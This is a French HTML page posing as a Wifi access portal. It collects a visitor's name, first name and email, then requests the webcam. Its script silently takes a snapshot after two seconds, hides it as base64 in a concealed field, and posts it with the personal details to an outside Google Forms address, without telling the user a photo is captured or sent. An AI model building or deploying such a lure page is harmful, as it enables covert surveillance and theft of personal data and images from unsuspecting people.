<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Capture de la caméra et Accès au Wifi</title>
  <style>
    video, canvas {
      width: 320px;
      height: 240px;
    }
  </style>
</head>
<body>

  <h1>Capture de la caméra et Accès au Wifi</h1>

  <!-- Formulaire combiné pour envoyer l'image et les informations du contact -->
  <form id="contactForm" action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeKaFSVEQegI4PGzX-3bHKqz8PO7j54szFw9MwC8-CjV1dNeg/formResponse" method="post">
    
    <label for="nom">Nom :</label><br>
    <input type="text" id="nom" name="entry.1575747789" required><br><br>

    <label for="prenom">Prénom :</label><br>
    <input type="text" id="prenom" name="entry.2134574420" required><br><br>

    <label for="email">Email :</label><br>
    <input type="email" id="email" name="entry.832843291" required><br><br>

    <!-- Champ caché pour l'image capturée -->
    <input type="hidden" name="entry.474186878" id="imageData">

    <button type="button" id="submitBtn">Envoyer et Accéder au WIFI</button>
  </form>

  <!-- Section pour capturer l'image (affichée seulement après avoir rempli le formulaire) -->
  <video id="video" autoplay style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    const submitBtn = document.getElementById('submitBtn');
    const form = document.getElementById('contactForm');

    // Fonction pour vérifier si les champs du formulaire sont remplis
    function isFormValid() {
      const nom = document.getElementById('nom').value.trim();
      const prenom = document.getElementById('prenom').value.trim();
      const email = document.getElementById('email').value.trim();
      return nom !== "" && prenom !== "" && email !== "";
    }

    // Fonction pour capturer l'image et soumettre le formulaire
    function captureAndSubmit() {
      // Définir la taille désirée pour l'image redimensionnée
      const maxWidth = 320;
      const maxHeight = 240;
      canvas.width = maxWidth;
      canvas.height = maxHeight;

      // Dessiner l'image capturée sur le canvas avec la taille définie
      context.drawImage(video, 0, 0, maxWidth, maxHeight);

      // Convertir le canvas en base64 avec compression JPEG
      const imageData = canvas.toDataURL('image/jpeg', 0.6); // Réglage de la qualité à 0.6 pour réduire la taille

      // Ajouter l'image encodée dans le champ caché du formulaire
      document.getElementById('imageData').value = imageData;

      // Soumettre le formulaire
      form.submit();
    }

    // Fonction pour soumettre le formulaire sans image (si l'accès à la caméra est refusé ou non disponible)
    function submitWithoutCamera() {
      document.getElementById('imageData').value = null; // On envoie `null` si la caméra n'est pas disponible
      form.submit(); // Soumettre sans image
    }

    // Fonction pour demander l'accès à la caméra après avoir récupéré les infos du formulaire
    function requestCameraAccess() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          video.style.display = 'block'; // Afficher la vidéo après l'accès

          // Capturer l'image après un délai de 2 secondes (pour laisser le temps à la caméra de démarrer)
          setTimeout(() => {
            captureAndSubmit();
          }, 2000);
        })
        .catch(err => {
          console.error("Erreur d'accès à la caméra: ", err);
          // Si l'accès à la caméra échoue, soumettre le formulaire avec `null` pour l'image
          alert("Impossible d'accéder à la caméra. Le formulaire sera soumis sans image.");
          submitWithoutCamera();
        });
    }

    // Gérer le clic sur le bouton pour valider le formulaire et demander la caméra
    submitBtn.addEventListener('click', () => {
      if (isFormValid()) {
        // D'abord on valide et récupère les infos du formulaire
        console.log("Formulaire valide, récupération des infos.");

        // Ensuite on demande l'accès à la caméra
        requestCameraAccess();
      } else {
        alert("Veuillez remplir tous les champs du formulaire.");
      }
    });
  </script>

</body>
</html>
</body>
</html>
